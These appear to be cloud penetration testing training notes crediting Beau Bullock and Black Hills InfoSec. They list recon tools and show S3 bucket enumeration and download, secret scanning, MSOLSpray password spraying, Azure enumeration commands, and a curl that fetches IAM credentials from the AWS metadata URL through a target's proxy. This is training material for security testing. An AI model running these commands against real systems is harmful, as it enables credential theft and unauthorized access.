# <h1 id="topheading">Cloud Pen Testing Tips</h1>

## Beau Bullock Notes:

Recon Tools Recon-NG
https://github.com/lanmaster53/recon-ng

OWASP Amass
https://github.com/OWASP/Amass

Spiderfoot
https://www.spiderfoot.net/

Gobuster
https://github.com/OJ/gobuster

Sublist3r
https://github.com/aboul3la/Sublist3r

DNS Brute Forcing:
https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

Now resolve all the domains you obtained and compare to cloud service netblock ranges

Azure Netblocks
Public: https://www.microsoft.com/en-us/download/details.aspx?id=56519
US Gov: http://www.microsoft.com/en-us/download/details.aspx?id=57063
Germany: http://www.microsoft.com/en-us/download/details.aspx?id=57064 China: http://www.microsoft.com/en-us/download/details.aspx?id=57062

AWS Netblocks
https://ip-ranges.amazonaws.com/ip-ranges.json

GCP Netblocks
Google made it complicated to get the current IP netblocks - there are scripts for this out there.

Determine username schema via public file Metadata (PDF, DOCX, XLSX, etc.)
PowerMeta
https://github.com/dafthack/PowerMeta

FOCA
https://github.com/ElevenPaths/FOCA

## Exploiting Misconfigured Cloud Assets
**Pacu S3 Enumeration**

Attempt to list S# contents:
aws s3 ls s3://<bucketname>/ --region <region>

Use the AWS cli to list out files in the S3 bucket
Pacu > aws s3 ls s3://glitchcloud

Download the files in the bucket
Pacu > aws s3 sync s3://glitchcloud s3-files-dir

## Key Discolsure in Public Repos

Search through not only current code but also commit history

GitLeaks
https://github.com/zricethezav/gitleaks

Gitrob
https://github.com/michenriksen/gitrob

Truffle Hog
https://github.com/dxa4481/truffleHog

**An AWS exploitation framework from Rhino Security Labs**
https://github.com/RhinoSecurityLabs/pacu
• Modules examples:
• S3 bucket discovery
• EC2 enumeration
• IAM privilege escalation • Persistence modules
• Exploitation modules
• And more...


**GitLeaks – Tool for searching Github or Gitlab repos**

Pull GitLeaks with Docker
~$ sudo docker pull zricethezav/gitleaks

Print the help menu
~$ sudo docker run --rm --name=gitleaks zricethezav/gitleaks --help

Use GitLeaks to search for secrets
~# sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git


**Password Spraying Attacks:**
MSOLSpray to do this:
https://github.com/dafthack/MSOLSpray

Next import MSOLSpray, and run the spray
PS> Import-Module .\MSOLSpray.ps1

PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password [the password you set for your test account]

**AWS Instance Metadata URL**
IAM credentials can be stored here:
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAMRole Name>

Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo

CapitalOne Hack
• Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data


WeirdAAL – Great tool for enumerating AWS access by Chris Gates
• https://github.com/carnal0wnage/weirdAAL

## Azure: User Information

Get the current user’s role assignment:
PS> Get-AzRoleAssignment

The below examples enumerate users and groups
PS> Get-MSolUser -All
PS> Get-MSolGroup –All
PS> Get-MSolGroupMember –GroupObjectId <GUID>

Pipe Get-MSolUser –All to format list to get all user attributes
PS> Get-MSolUser –All | fl

Recon can help identify the relationships between services such as WebApps and SQL
PS> Get-AzResource
PS> Get-AzResourceGroup

Start a new PowerShell window and import both the MSOnline and Az modules
PS> Import-Module MSOnline
PS> Import-Module Az

Authenticate to each service with your Azure AD account:
PS> Connect-AzAccount
PS> Connect-MsolService

Start a new PowerShell window and import both the MSOnline and Az modules
PS> Import-Module MSOnline
PS> Import-Module Az
Authenticate to each service with your Azure AD account:
PS> Connect-AzAccount
PS> Connect-MsolService
    © Offensive Tradecraft by BHIS @BHInfoSecurity
https://www.blackhillsinfosec.com

LAB: Azure Situational Awareness
• First get some basic Azure information Get- MSolCompanyInformation
• Some interesting items here are
• UsersPermissionToReadOtherUsersEnabled • DirSyncServiceAccount
• PasswordSynchronizationEnabled
• Address/phone/emails
PS> Get-MSolCompanyInformation
    © Offensive Tradecraft by BHIS @BHInfoSecurity
https://www.blackhillsinfosec.com

LAB: Azure Situational Awareness
• Next, we will start looking at the subscriptions associated with the account as well as look at the current context we are operating in. Look at the “Name” of the subscription and context for possible indication as to what it is associated with.
PS> Get-AzSubscription
PS> $context = Get-AzContext PS> $context.Name
PS> $context.Account

List out the users on the subscription. This is the equivalent of “net users /domain” in on-prem AD
PS> Get-MSolUser -All

The user you setup likely doesn’t have any resources currently associated with it, but these commands will help to understand the specific resources a user you gain access to has.
PS> Get-AzResource
PS> Get-AzResourceGroup

Breaching Cloud Perimeter with Beau Bullock:
https://www.blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/
---
